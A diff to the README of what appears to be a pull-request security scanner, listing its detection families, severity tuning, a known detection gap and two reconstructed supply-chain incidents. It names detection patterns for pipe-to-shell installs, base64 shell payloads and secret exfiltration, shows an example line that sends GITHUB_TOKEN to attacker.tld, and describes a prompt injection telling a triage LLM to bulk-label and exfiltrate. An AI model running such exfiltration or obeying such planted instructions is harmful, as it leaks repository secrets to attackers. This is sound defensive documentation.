@@ -32,7 +32,7 @@ That is the whole setup. The job fails when an indicator at or above `high` fire
 
 | Family | Examples |
 |---|---|
-| Workflow configuration | `pull_request_target` that checks out the PR head (the pwn-request that broke AsyncAPI) — by `ref:`, by a hand-rolled `git fetch`, or by opting back in with `allow-unsafe-pr-checkout: true` — plus `permissions: write-all` and CODEOWNERS reassignment |
+| Workflow configuration | `pull_request_target` that checks out the PR head (the pwn-request that broke AsyncAPI) by `ref:`, by a hand-rolled `git fetch`, or by opting back in with `allow-unsafe-pr-checkout: true`; plus `permissions: write-all` and CODEOWNERS reassignment |
 | Obfuscation | base64 that decodes to a shell payload, `_0x…` machine-mangled JavaScript, high-entropy blobs |
 | Execution | pipe-to-shell installs, `${IFS}` space-evasion, detached child processes, inline `node -e`, fetch-to-disk droppers |
 | Exfiltration | secrets reaching a network sink, cross-process `/proc/<pid>/mem` reads, OAST callback services, IPFS and permaweb gateways |
@@ -40,7 +40,7 @@ That is the whole setup. The job fails when an indicator at or above `high` fire
 | Provenance | forged `[bot]` identities, bot-mimicking new accounts, unsigned or identity-mismatched commits |
 | Prompt injection | instructions aimed at an LLM reviewer or triage workflow |
 
-**Severities are tuned, not maximal.** A plain workflow-file edit is `medium`, below the failure
+**Severities are tuned against noise.** A plain workflow-file edit is `medium`, below the failure
 threshold, on purpose: a benign workflow PR must not break your build. A `pull_request_target` on its own
 is `medium` too, because that is the ordinary label-bot shape. It becomes `critical` only when the same
 workflow also checks out the PR head. Rules that would be noisy alone require two halves to fire:
@@ -150,22 +150,22 @@ so a strong injection can skew the verdict. It cannot suppress the evidence. The
 to this at all, because no model runs.
 
 **Throughput.** A full model-driven episode takes seconds to minutes and costs real money per change.
-diff-sentry is the deep-analysis tier, not the firehose. The Action's deterministic scan is the cheap
-tier and is meant to run on everything; escalate only what it flags.
+That pipeline is the deep-analysis tier. The Action's deterministic scan is the cheap tier and is meant
+to run on everything; escalate only what it flags.
 
 **A known gap in the deterministic layer.** A secret read that reaches a JavaScript network sink across
 lines (`const t = process.env.GITHUB_TOKEN;` … `fetch('https://attacker.tld', {body: t})`) does not
-fire, because the exfiltration rule needs the secret and the sink within 80 characters on one line. The
-fix we evaluated (taint tracking from the assignment to the sink, suppressed for first-party hosts)
-measured zero false positives on our corpus and full history, but it still cannot separate a token
-being stolen from one legitimately posted to a third-party service, so it is not shipped rather than
-shipped noisy. Note the `pwn-request` rule does not cover this: it fires when a privileged workflow is
-*introduced*, not when a pre-existing one is *exploited*.
+fire, because the exfiltration rule needs the secret and the sink within 80 characters on one line.
+Taint tracking from the assignment to the sink would catch it, but it cannot separate a token being
+stolen from one legitimately posted to a third-party service, so the deterministic layer leaves this
+shape to the planner's judgement in the full pipeline. The `pwn-request` rule does not cover it either:
+that rule fires when a privileged workflow is *introduced*, and this shape exploits one that already
+exists.
 
 ## Grounded in real incidents
 
-The detection families are not hypothetical. Two incidents are reconstructed offline and pinned by
-tests, so a rule change that breaks coverage fails the build.
+Two incidents are reconstructed offline and pinned by tests, so a rule change that breaks coverage
+fails the build.
 
 **`hackerbot-claw`** (Datadog's [BewAIre writeup](https://www.datadoghq.com/blog/engineering/stopping-hackerbot-claw-with-bewaire/)).
 The original artifacts are gone, the attacker account was deleted, so
@@ -175,10 +175,10 @@ a prompt injection telling a triage LLM to bulk-label and exfiltrate, and a prom
 fake owner to CODEOWNERS. Each is asserted under a neutral benign verdict, so the alert is
 evidence-driven: a false-benign self-report could not have suppressed any of them.
 
-**AsyncAPI "Miasma"**. Reconstructing that chain stage by stage found seven of its eight stages passing
-our rules silently, because the suite was shell- and YAML-shaped while the attack was Node end to end.
-The rules that closed the gap ship with their negative cases, so the tuning is pinned as tightly as the
-detection.
+**AsyncAPI "Miasma"**. The attack was Node end to end, and `tests/test_indicators.py` reconstructs its
+stages: the `pull_request_target` workflow that checks out the PR head, the payload pushed off the diff
+viewport by a whitespace run, the IPFS fetch-to-disk dropper, and the `_0x` obfuscation injected into a
+source file. Each rule ships with its negative case, so the tuning is pinned as tightly as the detection.
 
 ## Development
 
